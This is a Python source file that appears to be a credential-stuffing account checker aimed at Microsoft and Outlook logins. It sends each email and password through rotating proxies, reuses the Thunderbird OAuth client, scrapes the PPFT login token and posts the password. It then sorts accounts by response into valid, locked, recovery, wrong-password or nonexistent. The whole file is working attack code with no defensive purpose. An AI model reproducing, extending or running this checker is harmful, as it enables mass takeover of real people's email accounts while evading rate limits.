import re, httpx
from headers import headers1, headers2, headers3
from utils import get_next_proxy, CONFIG

def check(email, password):
    retry_count = 0
    max_retries = CONFIG.get('max_proxy_retries', 10)
    account = f"{email}:{password}"

    while retry_count < max_retries:
        proxy = get_next_proxy()
        if not proxy:
            return account, "proxy_error"
        session = None
        try:
            session = httpx.Client(proxy=proxy, timeout=30.0)
            
            querystring = {
                "redirect_uri": "msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D",
                "client_id": "e6f8716e-299d-4ed9-bbf3-453f192f44e5",
                "response_type": "code",
                "login_hint": email,
                "state": "fo3JQhpJE4m9QBlN2Rho4w",
                "nonce": "yB_pchsTbmenvX90Yqk7TA",
                "scope": "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access",
                "code_challenge": "9U8TeNniUmMcmT1SkXG17prawHTT19xGIrhJfflNPW4",
                "code_challenge_method": "S256"
            }

            response = session.get(url="https://login.microsoftonline.com/common/oauth2/v2.0/authorize", 
                                 headers=headers1(), params=querystring)

            if response.status_code != 302:
                retry_count += 1
                continue

            redirect_url = response.headers.get("Location")
            if not redirect_url:
                retry_count += 1
                continue

            response = session.get(redirect_url, headers=headers2())
            
            if response.status_code != 200:
                retry_count += 1
                continue

            html = response.text
            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html)
            ppft = ppft_match.group(1) if ppft_match else ""
            pu_match = re.search(r"urlPost:'([^']+)'", html)
            post_url = pu_match.group(1) if pu_match else None
            
            if not post_url:
                retry_count += 1
                continue

            payload = {
                "ps": "2",
                "psRNGCDefaultType": "",
                "psRNGCEntropy": "",
                "psRNGCSLK": "",
                "canary": "",
                "ctx": "",
                "hpgrequestid": "",
                "PPFT": ppft,
                "PPSX": "PassportRN",
                "NewUser": "1",
                "FoundMSAs": "",
                "fspost": "0",
                "i21": "0",
                "CookieDisclosure": "0",
                "IsFidoSupported": "1",
                "isSignupPost": "0",
                "isRecoveryAttemptPost": "0",
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "lrt": "",
                "lrtPartition": "",
                "hisRegion": "",
                "hisScaleUnit": "",
                "passwd": password
            }

            response = session.post(post_url, data=payload, headers=headers3(redirect_url))

            if response.status_code != 200:
                retry_count += 1
                continue
    
            text = response.text
            location_header = response.headers.get("Location", "")
            
            if not text:
                if "?code=" in location_header:
                    return account, "valid"
                else:
                    return account, "other"
            
            if "action" in text:
                if "proofs" in text:
                    return account, "valid"
                elif "Consent/Update" in text:
                    return account, "valid"
                elif "ar/cancel" in text:
                    return account, "pending_security"
                elif "Abuse?" in text:
                    return account, "locked"
                elif "recover?" in text:
                    return account, "recovery"
                else:
                    return account, "invalid"
            elif "Your account or password is incorrect" in text:
                return account, "password"
            elif "That Microsoft account doesn" in text:
                return account, "not_exist"
            else:
                return account, "invalid"
                
        except httpx.RequestError:
            retry_count += 1
        except httpx.TimeoutException:
            retry_count += 1
        except Exception:
            retry_count += 1
        finally:
            if session:
                session.close()
                
    return account, "failed"